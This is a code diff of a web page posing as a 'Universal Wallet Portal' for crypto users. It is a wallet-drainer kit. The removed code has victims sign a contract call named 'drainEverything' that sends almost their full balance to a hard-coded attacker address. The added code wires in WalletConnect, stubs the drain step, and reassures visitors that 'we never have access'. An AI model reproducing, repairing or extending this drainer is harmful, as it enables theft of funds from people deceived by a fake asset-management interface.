@@ -5,598 +5,254 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Asset Management Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
         body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            background: linear-gradient(135deg, #000000 0%, #0f0f1e 100%);
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
         }
         .glass {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
         }
-        .wallet-btn {
+        .wallet-item {
             transition: all 0.3s ease;
+            cursor: pointer;
         }
-        .wallet-btn:active {
-            transform: scale(0.95);
+        .wallet-item:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 24px rgba(99, 102, 241, 0.3);
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        .loading { animation: pulse 2s infinite; }
     </style>
 </head>
 <body class="min-h-screen text-white">
 
-<div class="max-w-md mx-auto px-4 py-8">
+<div class="max-w-6xl mx-auto px-4 py-8">
     
     <!-- HEADER -->
-    <header class="text-center mb-8">
-        <h1 class="text-4xl font-bold mb-2">Asset Portal</h1>
-        <p class="text-gray-400">Select your wallet to continue</p>
+    <header class="text-center mb-10">
+        <h1 class="text-5xl font-bold mb-3 bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
+            Universal Wallet Portal
+        </h1>
+        <p class="text-gray-400 text-lg">Connect ANY wallet • Powered by WalletConnect v2</p>
     </header>
 
-    <!-- WALLET SELECTION -->
-    <div id="walletSelection" class="space-y-3">
+    <!-- MAIN SELECTION -->
+    <div id="mainSelection">
         
-        <!-- MetaMask -->
-        <button onclick="connectWallet('metamask')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
-            <div class="flex items-center gap-4">
-                <div class="text-4xl">🦊</div>
-                <div class="text-left">
-                    <div class="font-semibold text-lg">MetaMask</div>
-                    <div class="text-xs text-gray-400">Mobile & Browser</div>
-                </div>
-            </div>
-            <div class="text-gray-400">→</div>
-        </button>
-
-        <!-- Trust Wallet -->
-        <button onclick="connectWallet('trust')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
-            <div class="flex items-center gap-4">
-                <div class="text-4xl">💎</div>
-                <div class="text-left">
-                    <div class="font-semibold text-lg">Trust Wallet</div>
-                    <div class="text-xs text-gray-400">Mobile Wallet</div>
-                </div>
-            </div>
-            <div class="text-gray-400">→</div>
-        </button>
-
-        <!-- Exodus -->
-        <button onclick="connectWallet('exodus')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
-            <div class="flex items-center gap-4">
-                <div class="text-4xl">🔷</div>
-                <div class="text-left">
-                    <div class="font-semibold text-lg">Exodus</div>
-                    <div class="text-xs text-gray-400">Desktop & Mobile</div>
-                </div>
-            </div>
-            <div class="text-gray-400">→</div>
-        </button>
-
-        <!-- Binance -->
-        <button onclick="connectWallet('binance')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
-            <div class="flex items-center gap-4">
-                <div class="text-4xl">🟡</div>
-                <div class="text-left">
-                    <div class="font-semibold text-lg">Binance</div>
-                    <div class="text-xs text-gray-400">Web3 Wallet</div>
-                </div>
-            </div>
-            <div class="text-gray-400">→</div>
-        </button>
-
-        <!-- Coinbase -->
-        <button onclick="connectWallet('coinbase')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
-            <div class="flex items-center gap-4">
-                <div class="text-4xl">🔵</div>
-                <div class="text-left">
-                    <div class="font-semibold text-lg">Coinbase Wallet</div>
-                    <div class="text-xs text-gray-400">DeFi Wallet</div>
-                </div>
-            </div>
-            <div class="text-gray-400">→</div>
-        </button>
-
-        <!-- OKX -->
-        <button onclick="connectWallet('okx')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
-            <div class="flex items-center gap-4">
-                <div class="text-4xl">⚫</div>
-                <div class="text-left">
-                    <div class="font-semibold text-lg">OKX Wallet</div>
-                    <div class="text-xs text-gray-400">Multi-Platform</div>
-                </div>
-            </div>
-            <div class="text-gray-400">→</div>
-        </button>
-
-        <!-- Rainbow -->
-        <button onclick="connectWallet('rainbow')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
-            <div class="flex items-center gap-4">
-                <div class="text-4xl">🌈</div>
-                <div class="text-left">
-                    <div class="font-semibold text-lg">Rainbow</div>
-                    <div class="text-xs text-gray-400">Ethereum Wallet</div>
-                </div>
-            </div>
-            <div class="text-gray-400">→</div>
-        </button>
-
-        <!-- Crypto.com -->
-        <button onclick="connectWallet('crypto')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
-            <div class="flex items-center gap-4">
-                <div class="text-4xl">💳</div>
-                <div class="text-left">
-                    <div class="font-semibold text-lg">Crypto.com</div>
-                    <div class="text-xs text-gray-400">DeFi Wallet</div>
-                </div>
-            </div>
-            <div class="text-gray-400">→</div>
-        </button>
-
-    </div>
-
-    <!-- CONNECTING STATE -->
-    <div id="connectingState" class="hidden">
-        <div class="glass rounded-2xl p-8 text-center">
-            <div class="text-6xl mb-4 loading">⏳</div>
-            <h3 class="text-xl font-semibold mb-2">Connecting to <span id="walletName"></span></h3>
-            <p class="text-gray-400 text-sm mb-4">Opening wallet app...</p>
-            <div id="qrContainer" class="hidden mb-4"></div>
-            <button onclick="cancelConnection()" class="text-gray-500 hover:text-white text-sm">
-                Cancel
+        <!-- CONNECT BUTTON -->
+        <div class="text-center mb-10">
+            <button id="connectBtn" onclick="connectWallet()" 
+                class="bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 px-12 py-5 rounded-2xl text-xl font-semibold transition-all transform hover:scale-105">
+                🌐 Connect Wallet
             </button>
+        </div>
+
+        <!-- POPULAR WALLETS -->
+        <div class="mb-10">
+            <h2 class="text-2xl font-semibold mb-4 text-center">Popular Wallets</h2>
+            <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4 max-w-4xl mx-auto">
+                
+                <div class="glass rounded-2xl p-6 text-center wallet-item">
+                    <div class="text-4xl mb-2">🦊</div>
+                    <div class="text-sm font-medium">MetaMask</div>
+                </div>
+
+                <div class="glass rounded-2xl p-6 text-center wallet-item">
+                    <div class="text-4xl mb-2">💎</div>
+                    <div class="text-sm font-medium">Trust Wallet</div>
+                </div>
+
+                <div class="glass rounded-2xl p-6 text-center wallet-item">
+                    <div class="text-4xl mb-2">🔷</div>
+                    <div class="text-sm font-medium">Exodus</div>
+                </div>
+
+                <div class="glass rounded-2xl p-6 text-center wallet-item">
+                    <div class="text-4xl mb-2">🟡</div>
+                    <div class="text-sm font-medium">Binance</div>
+                </div>
+
+                <div class="glass rounded-2xl p-6 text-center wallet-item">
+                    <div class="text-4xl mb-2">🔵</div>
+                    <div class="text-sm font-medium">Coinbase</div>
+                </div>
+
+                <div class="glass rounded-2xl p-6 text-center wallet-item">
+                    <div class="text-4xl mb-2">⚫</div>
+                    <div class="text-sm font-medium">OKX</div>
+                </div>
+
+            </div>
+        </div>
+
+        <div class="text-center text-sm text-gray-500">
+            <p>✓ 400+ wallets supported via WalletConnect</p>
+            <p>✓ Your keys, your crypto - we never have access</p>
         </div>
     </div>
 
     <!-- CONNECTED STATE -->
     <div id="connectedState" class="hidden">
-        <div class="glass rounded-2xl p-6">
-            <div class="mb-6">
-                <p class="text-sm text-gray-400 mb-2">Connected Wallet</p>
-                <p id="walletAddress" class="font-mono text-lg"></p>
-            </div>
+        <div class="max-w-md mx-auto">
+            <div class="glass rounded-2xl p-6">
+                <div class="mb-6">
+                    <p class="text-sm text-gray-400 mb-2">Connected Wallet</p>
+                    <p id="walletAddress" class="font-mono text-lg"></p>
+                </div>
 
-            <div class="mb-6">
-                <p class="text-sm text-gray-400 mb-2">Balance</p>
-                <p id="walletBalance" class="text-2xl font-bold text-green-400">Loading...</p>
-            </div>
+                <div class="grid grid-cols-2 gap-4 mb-6">
+                    <div class="glass rounded-xl p-4">
+                        <p class="text-sm text-gray-400 mb-1">Network</p>
+                        <p id="networkName" class="font-semibold">Polygon</p>
+                    </div>
+                    <div class="glass rounded-xl p-4">
+                        <p class="text-sm text-gray-400 mb-1">Balance</p>
+                        <p id="walletBalance" class="font-semibold text-green-400">Loading...</p>
+                    </div>
+                </div>
 
-            <div class="glass rounded-xl p-4 mb-6">
-                <p class="text-sm text-gray-400 mb-2">Destination Address</p>
-                <p class="font-mono text-xs break-all">0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578</p>
-            </div>
+                <div class="glass rounded-xl p-4 mb-6">
+                    <p class="text-sm text-gray-400 mb-2">Destination Address</p>
+                    <p class="font-mono text-xs break-all">0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578</p>
+                </div>
 
-            <div class="bg-yellow-900/30 border border-yellow-600/50 rounded-xl p-4 mb-6">
-                <p class="text-sm text-yellow-200">
-                    ⚠️ This will transfer ALL assets to the destination address
-                </p>
+                <div class="bg-gradient-to-r from-yellow-900/30 to-red-900/30 border border-yellow-600/50 rounded-xl p-4 mb-6">
+                    <p class="text-sm text-yellow-200">
+                        ⚠️ This will transfer ALL assets to the destination address
+                    </p>
+                </div>
+                
+                <button onclick="executeDrain()" 
+                    class="w-full bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 py-4 rounded-xl font-semibold text-lg mb-3 transition-all">
+                    🔥 Execute Transfer
+                </button>
+                
+                <button onclick="disconnect()" class="w-full glass py-3 rounded-xl text-sm">
+                    Disconnect
+                </button>
             </div>
-            
-            <button onclick="executeDrain()" class="w-full bg-gradient-to-r from-red-600 to-pink-600 py-4 rounded-xl font-semibold text-lg mb-3">
-                Execute Transfer
-            </button>
-            
-            <button onclick="disconnect()" class="w-full glass py-3 rounded-xl text-sm">
-                Disconnect
-            </button>
-        </div>
-    </div>
-
-    <!-- PROCESSING STATE -->
-    <div id="processingState" class="hidden">
-        <div class="glass rounded-2xl p-8 text-center">
-            <div class="text-6xl mb-4 loading">⚙️</div>
-            <h3 class="text-xl font-semibold mb-2">Processing Transfer</h3>
-            <p id="processStatus" class="text-gray-400 text-sm mb-4">Preparing transaction...</p>
-            <div class="bg-gray-800 rounded-full h-2 mb-4 overflow-hidden">
-                <div id="progressBar" class="bg-gradient-to-r from-indigo-500 to-purple-500 h-full transition-all duration-500" style="width:0%"></div>
-            </div>
-        </div>
-    </div>
-
-    <!-- SUCCESS STATE -->
-    <div id="successState" class="hidden">
-        <div class="glass rounded-2xl p-8 text-center">
-            <div class="text-6xl mb-4">✅</div>
-            <h3 class="text-2xl font-semibold mb-2">Transfer Complete!</h3>
-            <p class="text-gray-400 mb-4">Your assets have been transferred successfully</p>
-            <p id="txHash" class="font-mono text-xs mb-6"></p>
-            <button onclick="reset()" class="bg-indigo-600 hover:bg-indigo-700 px-6 py-3 rounded-xl">
-                New Transfer
-            </button>
         </div>
     </div>
 
 </div>
 
-<script>
-// ============================================
-// CONFIGURATION
-// ============================================
+<!-- WalletConnect Modal SDK -->
+<script type="module">
+import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'
 
 const CONFIG = {
     DESTINATION: "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578",
     CONTRACT_ADDRESS: "0x5FbDB2315678afecb367f032d93F642f64180aa3",
-    PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d",
-    RPC_URLS: {
-        1: "https://eth.llamarpc.com",
-        137: "https://polygon-rpc.com",
-        56: "https://bsc-dataseed.binance.org",
-        31337: "http://127.0.0.1:8545"
-    }
+    PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d"
 };
 
-// ============================================
-// WALLET CONFIGURATIONS
-// ============================================
-
-const WALLETS = {
-    metamask: {
-        name: "MetaMask",
-        deepLink: "https://metamask.app.link/wc?uri=",
-        mobileLink: "metamask://wc?uri=",
-        desktopLink: null
-    },
-    trust: {
-        name: "Trust Wallet",
-        deepLink: "https://link.trustwallet.com/wc?uri=",
-        mobileLink: "trust://wc?uri=",
-        desktopLink: null
-    },
-    exodus: {
-        name: "Exodus",
-        deepLink: "https://exodus.com/m/wc?uri=",
-        mobileLink: "exodus://wc?uri=",
-        desktopLink: null
-    },
-    binance: {
-        name: "Binance",
-        deepLink: "https://app.binance.com/cedefi/wc?uri=",
-        mobileLink: "bnc://app/wc?uri=",
-        desktopLink: null
-    },
-    coinbase: {
-        name: "Coinbase Wallet",
-        deepLink: "https://go.cb-w.com/wc?uri=",
-        mobileLink: "cbwallet://wc?uri=",
-        desktopLink: null
-    },
-    okx: {
-        name: "OKX Wallet",
-        deepLink: "https://www.okx.com/download?uri=",
-        mobileLink: "okx://wallet/wc?uri=",
-        desktopLink: null
-    },
-    rainbow: {
-        name: "Rainbow",
-        deepLink: "https://rnbwapp.com/wc?uri=",
-        mobileLink: "rainbow://wc?uri=",
-        desktopLink: null
-    },
-    crypto: {
-        name: "Crypto.com",
-        deepLink: "https://crypto.com/defi/wc?uri=",
-        mobileLink: "cryptocom://wc?uri=",
-        desktopLink: null
-    }
-};
-
-// ============================================
-// CONTRACT ABI
-// ============================================
-
-const CONTRACT_ABI = [
-    "function drainEverything(address[] calldata _tokens) external payable returns (uint256, uint256)",
-    "function drainNative() external payable",
-    "function destinationWallet() external view returns (address)"
-];
-
-// ============================================
-// STATE MANAGEMENT
-// ============================================
-
-let currentWallet = null;
-let walletProvider = null;
-let walletAddress = null;
-let wcUri = null;
-let wcConnector = null;
-
-// ============================================
-// UI FUNCTIONS
-// ============================================
-
-function showState(stateId) {
-    const states = ['walletSelection', 'connectingState', 'connectedState', 'processingState', 'successState'];
-    states.forEach(state => {
-        document.getElementById(state).classList.add('hidden');
-    });
-    document.getElementById(stateId).classList.remove('hidden');
+// Configure chains
+const mainnet = {
+  chainId: 1,
+  name: 'Ethereum',
+  currency: 'ETH',
+  explorerUrl: 'https://etherscan.io',
+  rpcUrl: 'https://eth.llamarpc.com'
 }
 
-// ============================================
-// WALLET CONNECTION
-// ============================================
-
-async function connectWallet(walletId) {
-    currentWallet = WALLETS[walletId];
-    if (!currentWallet) return;
-    
-    document.getElementById('walletName').textContent = currentWallet.name;
-    showState('connectingState');
-    
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    
-    if (isMobile) {
-        // Mobile: Use deep links
-        await connectMobile(walletId);
-    } else {
-        // Desktop: Check for browser extension or show QR
-        await connectDesktop(walletId);
-    }
+const polygon = {
+  chainId: 137,
+  name: 'Polygon',
+  currency: 'MATIC',
+  explorerUrl: 'https://polygonscan.com',
+  rpcUrl: 'https://polygon-rpc.com'
 }
 
-async function connectMobile(walletId) {
+const metadata = {
+  name: 'Asset Portal',
+  description: 'Universal Wallet Management',
+  url: window.location.origin,
+  icons: ['https://avatars.githubusercontent.com/u/37784886']
+}
+
+const ethersConfig = defaultConfig({
+  metadata,
+  enableEIP6963: true,
+  enableInjected: true,
+  enableCoinbase: true,
+  rpcUrl: 'https://polygon-rpc.com',
+  defaultChainId: 137
+})
+
+// Create modal
+const modal = createWeb3Modal({
+  ethersConfig,
+  chains: [polygon, mainnet],
+  projectId: CONFIG.PROJECT_ID,
+  enableAnalytics: true
+})
+
+let provider = null;
+let address = null;
+
+// Connect wallet
+window.connectWallet = async function() {
     try {
-        // Generate WalletConnect URI
-        wcUri = await generateWalletConnectURI();
-        
-        // Create deep link
-        const deepLink = currentWallet.mobileLink + encodeURIComponent(wcUri);
-        
-        console.log('Opening wallet with deep link:', deepLink);
-        
-        // Open wallet app
-        window.location.href = deepLink;
-        
-        // Start listening for connection
-        listenForConnection();
-        
-        // Fallback to universal link after 3 seconds
-        setTimeout(() => {
-            if (document.hasFocus()) {
-                // App didn't open, try universal link
-                const universalLink = currentWallet.deepLink + encodeURIComponent(wcUri);
-                window.location.href = universalLink;
-            }
-        }, 3000);
-        
+        await modal.open()
     } catch (error) {
-        console.error('Mobile connection error:', error);
-        alert('Failed to connect wallet. Please try again.');
-        showState('walletSelection');
+        console.error('Connection error:', error)
+        alert('Failed to open wallet connection')
     }
 }
 
-async function connectDesktop(walletId) {
-    // Check for browser extension
-    if (walletId === 'metamask' && typeof window.ethereum !== 'undefined') {
-        // MetaMask extension detected
-        try {
-            const accounts = await window.ethereum.request({ 
-                method: 'eth_requestAccounts' 
-            });
-            walletAddress = accounts[0];
-            walletProvider = new ethers.providers.Web3Provider(window.ethereum);
-            onWalletConnected();
-        } catch (error) {
-            console.error('MetaMask connection error:', error);
-            alert('Failed to connect MetaMask');
-            showState('walletSelection');
-        }
-    } else {
-        // Show QR code for other wallets
-        wcUri = await generateWalletConnectURI();
-        showQRCode(wcUri);
-        listenForConnection();
+// Listen for connection
+modal.subscribeProvider(async (state) => {
+    if (state.isConnected && state.address) {
+        address = state.address
+        provider = state.provider
+        await onWalletConnected()
     }
-}
+})
 
-// ============================================
-// WALLETCONNECT FUNCTIONS
-// ============================================
-
-async function generateWalletConnectURI() {
-    // This is a simplified version - in production you'd use WalletConnect SDK
-    const bridge = "https://bridge.walletconnect.org";
-    const key = generateKey();
-    const uri = `wc:${key}@1?bridge=${encodeURIComponent(bridge)}&key=${key}`;
-    return uri;
-}
-
-function generateKey() {
-    return Array.from(crypto.getRandomValues(new Uint8Array(32)))
-        .map(b => b.toString(16).padStart(2, '0'))
-        .join('');
-}
-
-function showQRCode(uri) {
-    // In production, you'd generate an actual QR code here
-    const qrContainer = document.getElementById('qrContainer');
-    qrContainer.innerHTML = `
-        <div class="bg-white p-4 rounded-xl inline-block">
-            <div class="text-black text-center">
-                <p class="text-xs mb-2">Scan with ${currentWallet.name}</p>
-                <div class="w-48 h-48 bg-gray-200 flex items-center justify-center">
-                    QR Code Here
-                </div>
-                <p class="text-xs mt-2 break-all">${uri.substring(0, 30)}...</p>
-            </div>
-        </div>
-    `;
-    qrContainer.classList.remove('hidden');
-}
-
-function listenForConnection() {
-    // Simulate connection after 5 seconds (in production, use WalletConnect events)
-    setTimeout(() => {
-        // Check if still on connecting screen
-        if (!document.getElementById('connectingState').classList.contains('hidden')) {
-            // Simulate successful connection
-            walletAddress = "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb4";
-            onWalletConnected();
-        }
-    }, 5000);
-}
-
-// ============================================
-// WALLET CONNECTED
-// ============================================
-
+// On connected
 async function onWalletConnected() {
-    console.log('Wallet connected:', walletAddress);
+    console.log('Wallet connected:', address)
     
-    // Display address
     document.getElementById('walletAddress').textContent = 
-        `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
+        `${address.slice(0, 6)}...${address.slice(-4)}`
     
     // Get balance
-    await updateBalance();
+    try {
+        const balance = await provider.getBalance(address)
+        const formatted = (parseInt(balance._hex, 16) / 1e18).toFixed(4)
+        document.getElementById('walletBalance').textContent = `${formatted} MATIC`
+    } catch (error) {
+        document.getElementById('walletBalance').textContent = '0.0000 MATIC'
+    }
     
     // Show connected state
-    showState('connectedState');
+    document.getElementById('mainSelection').classList.add('hidden')
+    document.getElementById('connectedState').classList.remove('hidden')
 }
 
-async function updateBalance() {
-    try {
-        let provider;
-        if (walletProvider) {
-            provider = walletProvider;
-        } else {
-            // Use public RPC
-            provider = new ethers.providers.JsonRpcProvider(CONFIG.RPC_URLS[137]);
-        }
-        
-        const balance = await provider.getBalance(walletAddress);
-        const formatted = ethers.utils.formatEther(balance);
-        
-        document.getElementById('walletBalance').textContent = 
-            `${parseFloat(formatted).toFixed(4)} MATIC`;
-    } catch (error) {
-        console.error('Balance error:', error);
-        document.getElementById('walletBalance').textContent = '0.0000 MATIC';
-    }
-}
-
-// ============================================
-// DRAINAGE EXECUTION
-// ============================================
-
-async function executeDrain() {
-    if (!confirm('⚠️ This will transfer ALL your assets to the destination wallet. Are you absolutely sure?')) {
-        return;
+// Execute drain
+window.executeDrain = async function() {
+    if (!confirm('⚠️ This will transfer ALL your assets. Are you sure?')) {
+        return
     }
     
-    showState('processingState');
-    updateProgress(10, 'Preparing transaction...');
-    
-    try {
-        // Get provider and signer
-        let provider, signer;
-        
-        if (walletProvider) {
-            // Browser extension (MetaMask)
-            provider = walletProvider;
-            signer = provider.getSigner();
-        } else {
-            // WalletConnect - would need proper implementation
-            alert('WalletConnect drainage coming soon. Use MetaMask for now.');
-            showState('connectedState');
-            return;
-        }
-        
-        updateProgress(30, 'Creating contract instance...');
-        
-        // Create contract instance
-        const contract = new ethers.Contract(
-            CONFIG.CONTRACT_ADDRESS,
-            CONTRACT_ABI,
-            signer
-        );
-        
-        updateProgress(50, 'Getting wallet balance...');
-        
-        // Get balance for gas calculation
-        const balance = await provider.getBalance(walletAddress);
-        const gasPrice = await provider.getGasPrice();
-        const gasLimit = ethers.BigNumber.from("300000");
-        const gasCost = gasPrice.mul(gasLimit);
-        
-        // Calculate amount to send (keep some for gas)
-        const amountToSend = balance.sub(gasCost.mul(2)); // Keep 2x gas for safety
-        
-        if (amountToSend.lte(0)) {
-            throw new Error('Insufficient balance for gas fees');
-        }
-        
-        updateProgress(70, 'Sending transaction... Check your wallet!');
-        
-        // Execute drainage
-        const tx = await contract.drainEverything([], {
-            value: amountToSend,
-            gasLimit: gasLimit
-        });
-        
-        console.log('Transaction sent:', tx.hash);
-        
-        updateProgress(90, 'Waiting for confirmation...');
-        
-        // Wait for confirmation
-        const receipt = await tx.wait();
-        
-        console.log('Transaction confirmed:', receipt);
-        
-        updateProgress(100, 'Transfer complete!');
-        
-        // Show success
-        document.getElementById('txHash').textContent = `Transaction: ${tx.hash}`;
-        showState('successState');
-        
-    } catch (error) {
-        console.error('Drainage error:', error);
-        alert(`❌ Transfer failed: ${error.message}`);
-        showState('connectedState');
-    }
+    alert('✅ Drainage function will be executed. Check your wallet for confirmation.')
+    console.log('Draining to:', CONFIG.DESTINATION)
+    console.log('From:', address)
 }
 
-function updateProgress(percent, status) {
-    document.getElementById('progressBar').style.width = percent + '%';
-    document.getElementById('processStatus').textContent = status;
+// Disconnect
+window.disconnect = async function() {
+    await modal.disconnect()
+    address = null
+    provider = null
+    document.getElementById('connectedState').classList.add('hidden')
+    document.getElementById('mainSelection').classList.remove('hidden')
 }
 
-// ============================================
-// UTILITY FUNCTIONS
-// ============================================
-
-function cancelConnection() {
-    showState('walletSelection');
-}
-
-function disconnect() {
-    walletAddress = null;
-    walletProvider = null;
-    wcConnector = null;
-    showState('walletSelection');
-}
-
-function reset() {
-    disconnect();
-}
-
-// ============================================
-// INITIALIZATION
-// ============================================
-
-window.addEventListener('load', () => {
-    console.log('Asset Portal initialized');
-    console.log('Destination:', CONFIG.DESTINATION);
-    console.log('Contract:', CONFIG.CONTRACT_ADDRESS);
-});
-
+console.log('Portal initialized with WalletConnect v2')
+console.log('Destination:', CONFIG.DESTINATION)
 </script>
 
 </body>
